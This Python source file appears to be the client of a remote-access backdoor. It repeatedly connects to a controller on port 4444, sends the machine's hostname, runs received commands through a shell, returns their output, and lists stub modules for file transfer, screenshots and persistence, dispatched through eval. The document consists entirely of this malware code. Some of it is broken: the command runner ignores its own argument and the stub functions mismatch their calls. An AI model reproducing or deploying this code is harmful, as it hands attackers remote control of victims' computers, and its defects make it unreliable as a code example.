import socket
import os
import subprocess

s = socket.socket()
host = 'localhost'
port = 4444
modules = ["cd","put","get","pic","remote","persistent","remove","terminate"]
def conntoserver():
	global wd
	while True:
		try:
			s.connect((host, port))
			break
		except:
			pass

	s.send(b"BTconn")
	s.settimeout(5)
	s.sendall(str(socket.gethostname()).encode())
	wd = os.getcwd() + "\\"
def getrecv(buffersize=1024):
	return s.recv(1024).decode("utf-8", "replace")

def sendstr(string):
	s.send(string.encode())


#modules
def cd(data):
	global wd
	nwd = wd
	print(nwd)
	if data=="..":
		nwd = nwd[:-len(nwd.split("\\")[-2])-1]
	elif data[1:3] == ":\\":
		nwd = data

	elif data.startswith("."):
		if data[1:].startswith("/") or data[1:].startswith("\\") or data[1:].startswith(" "):
			nwd += data[2:]
	else:
		nwd += data
	if not nwd[-1]=="\\":
		nwd += "\\"
	if commprompt("echo hi",nwd,False):
		wd = nwd
		print("!"+wd)
		sendstr(wd)
	else:
		sendstr("Path is not valid!")
	print(wd)

def put():
	sendstr("put")
def get():
	sendstr("get")
def pic():
	sendstr("pic")
def remote():
	sendstr("remote")
def persistent():
	sendstr("persistent")
def remove():
	sendstr("remove")
def terminate():
	sendstr("terminate")
def commprompt(command, workdic, send=True):
	try:
		cmd = subprocess.Popen(data, cwd=workdic, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		if send:
			sendstr(str((cmd.stdout.read() + cmd.stderr.read()).decode('utf-8', "replace")))
		return True
	except:
		return False
while True:
	conntoserver()
	try:
		while True:
			data = getrecv()
			if "handler!" in data:
				sendstr("$"+wd)
				continue
			elif "stillthere" in data:
				s.send(b"stillthere")
				if not data.replace("stillthere", "")=="":
					data = data.replace("stillthere", "")
					print("yes still here")
				else:
					continue
			print(data)
			module = str(data.split(" ")[0])
			iscmd=True
			for i in modules:
				if module == i:
					eval(str(i + "(data.replace(i + ' ',''))"))
					iscmd=False
					break
			if iscmd:
				commprompt(data,wd)
	except:
		pass